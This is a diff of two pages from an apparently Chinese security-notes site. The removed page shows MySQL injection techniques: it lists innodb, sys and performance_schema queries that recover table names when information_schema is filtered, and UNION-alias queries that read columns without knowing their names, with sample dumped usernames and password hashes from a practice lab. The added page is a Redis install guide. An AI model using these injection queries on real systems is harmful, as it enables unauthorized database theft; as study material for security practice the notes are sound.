@@ -15,7 +15,7 @@
     
     
       
-        <title>SQL注入限制条件下获取表名&无列名注入 - My Docs</title>
+        <title>Redis - My Docs</title>
       
     
     
@@ -49,7 +49,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#sql" class="md-skip">
+        <a href="#redis" class="md-skip">
           Skip to content
         </a>
       
@@ -77,7 +77,7 @@
           </span>
           <span class="md-header-nav__topic md-ellipsis">
             
-              SQL注入限制条件下获取表名&无列名注入
+              Redis
             
           </span>
         </div>
@@ -248,93 +248,11 @@
           
           
 
-  
 
-
-  <li class="md-nav__item md-nav__item--active">
-    
-    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
-    
-      
-    
-    
-      <label class="md-nav__link md-nav__link--active" for="__toc">
-        SQL注入限制条件下获取表名&无列名注入
-        <span class="md-nav__icon md-icon">
-          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 9h14V7H3v2m0 4h14v-2H3v2m0 4h14v-2H3v2m16 0h2v-2h-2v2m0-10v2h2V7h-2m0 6h2v-2h-2v2z"/></svg>
-        </span>
-      </label>
-    
-    <a href="./" title="SQL注入限制条件下获取表名&无列名注入" class="md-nav__link md-nav__link--active">
+  <li class="md-nav__item">
+    <a href="../NoColumnInjection/" title="SQL注入限制条件下获取表名&无列名注入" class="md-nav__link">
       SQL注入限制条件下获取表名&无列名注入
     </a>
-    
-      
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon">
-        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
-      </span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#_1" class="md-nav__link">
-    获取表名
-  </a>
-  
-    <nav class="md-nav" aria-label="获取表名">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#innodb" class="md-nav__link">
-    innodb存储引擎
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#sys" class="md-nav__link">
-    sys
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    无列名注入
-  </a>
-  
-    <nav class="md-nav" aria-label="无列名注入">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#join" class="md-nav__link">
-    利用join进行无列名注入
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-    
   </li>
 
         
@@ -354,11 +272,53 @@
           
           
 
+  
 
-  <li class="md-nav__item">
-    <a href="../Redis/" title="Redis" class="md-nav__link">
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-nav__toggle md-toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Redis
+        <span class="md-nav__icon md-icon">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 9h14V7H3v2m0 4h14v-2H3v2m0 4h14v-2H3v2m16 0h2v-2h-2v2m0-10v2h2V7h-2m0 6h2v-2h-2v2z"/></svg>
+        </span>
+      </label>
+    
+    <a href="./" title="Redis" class="md-nav__link md-nav__link--active">
       Redis
     </a>
+    
+      
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    安装
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+    
   </li>
 
         
@@ -514,48 +474,8 @@
       
         <li class="md-nav__item">
   <a href="#_1" class="md-nav__link">
-    获取表名
+    安装
   </a>
-  
-    <nav class="md-nav" aria-label="获取表名">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#innodb" class="md-nav__link">
-    innodb存储引擎
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#sys" class="md-nav__link">
-    sys
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#_2" class="md-nav__link">
-    无列名注入
-  </a>
-  
-    <nav class="md-nav" aria-label="无列名注入">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#join" class="md-nav__link">
-    利用join进行无列名注入
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
   
 </li>
       
@@ -575,173 +495,24 @@
                   
                 
                 
-                <h1 id="sql">SQL注入限制条件下获取表名&amp;无列名注入<a class="headerlink" href="#sql" title="Permanent link">&para;</a></h1>
-<div class="toc">
-<ul>
-<li><a href="#sql">SQL注入限制条件下获取表名&amp;无列名注入</a><ul>
-<li><a href="#_1">获取表名</a><ul>
-<li><a href="#innodb">innodb存储引擎</a></li>
-<li><a href="#sys">sys</a></li>
-</ul>
-</li>
-<li><a href="#_2">无列名注入</a><ul>
-<li><a href="#join">利用join进行无列名注入</a></li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</div>
-<h2 id="_1">获取表名<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
-<h3 id="innodb">innodb存储引擎<a class="headerlink" href="#innodb" title="Permanent link">&para;</a></h3>
-<p>Mysql&gt;5.6.x
-对于waf掉<code>information_schema</code>，可以利用<code>innodb_table_stats</code>和<code>innodb_table_stats</code>两个表来查询到
-但是mysql默认是关闭InnoDB存储引擎的
-<div class="highlight"><pre><span></span><code><span class="k">select</span> <span class="n">table_name</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="n">innodb_table_stats</span> <span class="k">where</span> <span class="n">database_name</span> <span class="o">=</span> <span class="k">database</span><span class="p">();</span>
-<span class="k">select</span> <span class="n">table_name</span> <span class="k">from</span> <span class="n">mysql</span><span class="p">.</span><span class="n">innodb_index_stats</span> <span class="k">where</span> <span class="n">database_name</span> <span class="o">=</span> <span class="k">database</span><span class="p">();</span>
+                <h1 id="redis">Redis<a class="headerlink" href="#redis" title="Permanent link">&para;</a></h1>
+<h2 id="_1">安装<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>官网下载
+<a href="http://www.redis.cn/download.html">下载链接</a>
+得到<code>redis-6.0.6.tar.gz</code></p>
+<p>放到Linux解压<code>tar -zxvf redis-6.0.6.tar.gz</code></p>
+<p><div class="highlight"><pre><span></span><code>cd redis-6.0.6 
+</code></pre></div>
+编译安装<code>make</code></p>
+<p>开启服务端 <code>redis-server</code>
+指定服务端配置文件启动 <code>redis-server ../redis.conf</code></p>
+<p>启动客户端与服务端交互
+<div class="highlight"><pre><span></span><code>$ ./redis-cli
+redis&gt; <span class="nb">set</span> foo bar
+OK
+redis&gt; get foo
+<span class="s2">&quot;bar&quot;</span>
 </code></pre></div></p>
-<h3 id="sys">sys<a class="headerlink" href="#sys" title="Permanent link">&para;</a></h3>
-<p>在MySQL 5.7.9中sys中新增了一些视图，可以从中获取表名
-<div class="highlight"><pre><span></span><code><span class="o">//</span><span class="err">包含</span><span class="k">in</span>
-<span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">x$innodb_buffer_stats_by_table</span><span class="o">`</span> <span class="k">where</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">database</span><span class="p">();</span>
-<span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">innodb_buffer_stats_by_table</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
-<span class="k">SELECT</span> <span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">x$schema_index_statistics</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">TABLE_SCHEMA</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
-<span class="k">SELECT</span> <span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">schema_auto_increment_columns</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">TABLE_SCHEMA</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
-
-<span class="o">//</span><span class="err">不包含</span><span class="k">in</span>
-<span class="k">SELECT</span> <span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">x$schema_flattened_keys</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">TABLE_SCHEMA</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
-<span class="k">SELECT</span> <span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">x$ps_schema_table_statistics_io</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">TABLE_SCHEMA</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
-<span class="k">SELECT</span> <span class="k">TABLE_NAME</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">x$schema_table_statistics_with_buffer</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">TABLE_SCHEMA</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
-
-<span class="o">//</span><span class="err">通过表文件的存储路径获取表名</span>
-<span class="k">SELECT</span> <span class="n">FILE</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">io_global_by_file_by_bytes</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">FILE</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
-<span class="k">SELECT</span> <span class="n">FILE</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">io_global_by_file_by_latency</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">FILE</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
-<span class="k">SELECT</span> <span class="n">FILE</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">x$io_global_by_file_by_bytes</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">FILE</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
-</code></pre></div>
-包含之前查询记录的表
-<div class="highlight"><pre><span></span><code><span class="k">SELECT</span> <span class="n">QUERY</span> <span class="k">FROM</span> <span class="n">sys</span><span class="p">.</span><span class="n">x$statement_analysis</span> <span class="k">WHERE</span> <span class="n">QUERY</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
-<span class="k">SELECT</span> <span class="n">QUERY</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">sys</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">statement_analysis</span><span class="o">`</span> <span class="k">where</span> <span class="n">QUERY</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
-</code></pre></div>
-performance_schema
-<div class="highlight"><pre><span></span><code><span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">objects_summary_global_by_type</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
-<span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">table_handles</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
-<span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">table_io_waits_summary_by_index_usage</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
-<span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">table_io_waits_summary_by_table</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
-<span class="k">SELECT</span> <span class="n">object_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">table_lock_waits_summary_by_table</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">object_schema</span> <span class="o">=</span> <span class="k">DATABASE</span><span class="p">();</span>
-</code></pre></div>
-包含之前查询记录的表
-<div class="highlight"><pre><span></span><code><span class="k">SELECT</span> <span class="n">digest_text</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">events_statements_summary_by_digest</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">digest_text</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
-</code></pre></div>
-包含表文件路径的表
-<div class="highlight"><pre><span></span><code><span class="k">SELECT</span> <span class="n">file_name</span> <span class="k">FROM</span> <span class="o">`</span><span class="n">performance_schema</span><span class="o">`</span><span class="p">.</span><span class="o">`</span><span class="n">file_instances</span><span class="o">`</span> <span class="k">WHERE</span> <span class="n">file_name</span> <span class="n">REGEXP</span> <span class="k">DATABASE</span><span class="p">();</span>
-</code></pre></div></p>
-<h2 id="_2">无列名注入<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
-<h3 id="join">利用<code>join</code>进行无列名注入<a class="headerlink" href="#join" title="Permanent link">&para;</a></h3>
-<p><code>select 1,2,3,4 union select * from users;</code>  </p>
-<table>
-<thead>
-<tr>
-<th>1</th>
-<th>2</th>
-<th>3</th>
-<th>4</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>1</td>
-<td>2</td>
-<td>3</td>
-<td>4</td>
-</tr>
-<tr>
-<td>1</td>
-<td>admin</td>
-<td>e10adc3949ba59abbe56e057f20f883e</td>
-<td>1</td>
-</tr>
-<tr>
-<td>2</td>
-<td>pikachu</td>
-<td>670b14728ad9902aecba32e22fa4f6bd</td>
-<td>2</td>
-</tr>
-<tr>
-<td>3</td>
-<td>test</td>
-<td>e99a18c428cb38d5f260853678922e03</td>
-<td>3</td>
-</tr>
-</tbody>
-</table>
-<p><code>select `3` from (select 1,2,3,4 union select * from users)a;</code></p>
-<table>
-<thead>
-<tr>
-<th>3</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>3</td>
-</tr>
-<tr>
-<td>e10adc3949ba59abbe56e057f20f883e</td>
-</tr>
-<tr>
-<td>670b14728ad9902aecba32e22fa4f6bd</td>
-</tr>
-<tr>
-<td>e99a18c428cb38d5f260853678922e03</td>
-</tr>
-</tbody>
-</table>
-<p>如果```被过滤，使用别名来代替：</p>
-<p><code>select b from (select 1,2 as b,3,4 as c union select * from users)a;</code></p>
-<table>
-<thead>
-<tr>
-<th>b</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>2</td>
-</tr>
-<tr>
-<td>admin</td>
-</tr>
-<tr>
-<td>pikachu</td>
-</tr>
-<tr>
-<td>test</td>
-</tr>
-</tbody>
-</table>
-<p>同时查询多个列：</p>
-<p><code>select concat(b,0x2d,c) from (select 1,2 as b,3 as c,4 union select * from users)a;</code></p>
-<table>
-<thead>
-<tr>
-<th>concat(b,0x2d,c)</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>2-3</td>
-</tr>
-<tr>
-<td>admin-e10adc3949ba59abbe56e057f20f883e</td>
-</tr>
-<tr>
-<td>pikachu-670b14728ad9902aecba32e22fa4f6bd</td>
-</tr>
-<tr>
-<td>test-e99a18c428cb38d5f260853678922e03</td>
-</tr>
-</tbody>
-</table>
                 
               
               
@@ -760,7 +531,7 @@ performance_schema
     <div class="md-footer-nav">
       <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
         
-          <a href="../PhpTricks/" title="PHP的一些 “特性”" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+          <a href="../PhpUnserialization/" title="PHP反序列化" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
             <div class="md-footer-nav__button md-icon">
               <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
             </div>
@@ -769,19 +540,19 @@ performance_schema
                 <span class="md-footer-nav__direction">
                   Previous
                 </span>
-                PHP的一些 “特性”
+                PHP反序列化
               </div>
             </div>
           </a>
         
         
-          <a href="../PhpUnserialization/" title="PHP反序列化" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+          <a href="../../usually/docker%2BPHPdebug/" title="docker+PHPdebug" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
             <div class="md-footer-nav__title">
               <div class="md-ellipsis">
                 <span class="md-footer-nav__direction">
                   Next
                 </span>
-                PHP反序列化
+                docker+PHPdebug
               </div>
             </div>
             <div class="md-footer-nav__button md-icon">
